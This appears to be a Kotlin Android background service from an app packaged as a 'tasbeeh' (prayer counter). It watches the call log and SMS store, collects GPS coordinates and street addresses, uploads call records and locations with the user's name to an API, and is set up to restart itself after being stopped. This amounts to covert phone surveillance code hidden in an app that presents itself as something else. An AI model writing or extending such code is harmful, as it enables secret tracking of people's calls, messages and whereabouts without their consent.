package com.example.tasbeeh
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.provider.CallLog
import android.provider.Telephony
import androidx.annotation.Nullable
import androidx.annotation.RequiresApi
import java.lang.String
import java.text.DateFormat
import java.util.*


class MyService : Service() {
//    private var player: MediaPlayer? = null
    private val m: MainActivity? = null
    public lateinit var username:String



    private var observer = CallLogObserver(Handler())
    private var observerSms=SmsLogObserver(Handler())
    @Nullable
    override fun onBind(intent: Intent): IBinder? // Bind service with activity,if we want to not bind activity with bind return null
    {
        return null
    }

    override fun onCreate() {
       // onDestroy()
        super.onCreate()
    }

    @RequiresApi(Build.VERSION_CODES.KITKAT)
    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
     //   player=MediaPlayer.create(this, Settings.System.DEFAULT_NOTIFICATION_URI);
       // player?.setLooping(true);
        //networkConnectivity(intent)

        var sp:SharedPreferences = getSharedPreferences("login", Context.MODE_PRIVATE)
            var username: kotlin.String? = sp.getString("username", "phone")







        observer.onChange(observer.deliverSelfNotifications(), CallLog.Calls.CONTENT_URI)
        observerSms.onChange(observer.deliverSelfNotifications(),Telephony.Sms.CONTENT_URI)
        networkConnectivity(intent)
        getLocationData()



        //     MainActivity.observerFlag=true
        return START_STICKY// explicity start and stop this service
    }

    override fun onDestroy() {
        // super.onDestroy();
       // println("ONDESTROY SERVICE")
        var m=MainActivity()
       // println("ApplicationContext "+applicationContext.toString())
        var broadcastIntent = Intent(applicationContext, broadccast::class.java)
       // println("broadcastIntent=  "+broadcastIntent.toString())
        sendBroadcast(broadcastIntent)

       // println("Destroy")
     //   player!!.stop()
    }

    fun networkConnectivity(intent: Intent) {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).state == NetworkInfo.State.CONNECTED ||
                connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI).state == NetworkInfo.State.CONNECTED)
        {
            var main = MainActivity()
            var list = MainActivity.getDataFromSqlite()

            if (list!!.size > 0 )
            {
                var CallLogModel=MainActivity.getLastCallLogFromSqlite(MainActivity.contentResolver,MainActivity?.contextMe)
                main.createPost(list)
                main.deleteCallLog()
                main.insertDataInSqlLite(CallLogModel!!)
            }
/*            if(listOfSms!!.size>0)
            {
                //var listFromApi=MainActivity.getSmsDetailsFromApi()
                //var lastIndex=listFromApi?.size
              //  var lastElement= lastIndex?.minus(1)?.let { listFromApi?.get(it) }

                SmsLogLast=MainActivity.getLastSmsLogFromSqlite(MainActivity.contentResolver)

                main.sendSmsDetails(listOfSms)
                main.deleteSmsLog()
                    // var listSms=MainActivity.getAllSmsDataFromSqlite()
                    // var SmsLogLastFake=MainActivity.getLastSmsLogFromSqlite(MainActivity.contentResolver)
                main.insertDataInSqliteSms(SmsLogLast!!)


            }

 */
        }
        val intents = Intent()
        intents.setClass(MainActivity?.contextMe, MyService::class.java)
        stopService(intents)

       // println("Stop service")
       // startService(intent)
    }
    fun getLocationData()
    {
        val gpsTracker = GPSTracker(this)
        gpsTracker.GPSTracker(applicationContext)


        if (gpsTracker.getIsGPSTrackingEnabled()) {
            val stringLatitude = String.valueOf(gpsTracker.latitude)

            val stringLongitude = String.valueOf(gpsTracker.longitude)

            val country = gpsTracker.getCountryName(this)
            val addressLine = gpsTracker.getAddressLine(applicationContext)
            var lastAddress:kotlin.String=""
            if (addressLine != null) {
                lastAddress=lastAddress+addressLine
            }
            val city = gpsTracker.getLocality(this)
            if (city != null) {
                lastAddress=lastAddress+city
            }
            val postalCode = gpsTracker.getPostalCode(this)
            if (postalCode != null){
                lastAddress=lastAddress+postalCode
            }
            if (country != null) {
                lastAddress=lastAddress+country
            }
            var m=MainActivity()
            var lastAddressFromSqlite=MainActivity.getLastLocationFromSqlite(MainActivity.contentResolver)

            if(lastAddressFromSqlite?.getArea().toString().equals(lastAddress)){

            }
            else{
                val date =
                    DateFormat.getDateTimeInstance().format(Date())
                var list=ArrayList<LocationModel?>();
                var context=MainActivity?.contextMe
                var sp: SharedPreferences? =context?.getSharedPreferences("login", Context.MODE_PRIVATE)
                var username: kotlin.String? = sp?.getString("username", "phone")



                val l=LocationModel(stringLatitude,stringLongitude,lastAddress,date,username)
                list.add(l)
                m.sendLocationDetailsIntoAPI(list)
                m.deleteLocation()
                var listOfAllLocation = MainActivity.getAllLocationData()
                if(listOfAllLocation?.size==0)
                {
                    m.insertDataInSqlLiteLocation(l!!)
                }
                var c=  MainActivity.getAllLocationData()?.size
                println(c.toString())
            }
            //  textview.append(country);
        }
    }


}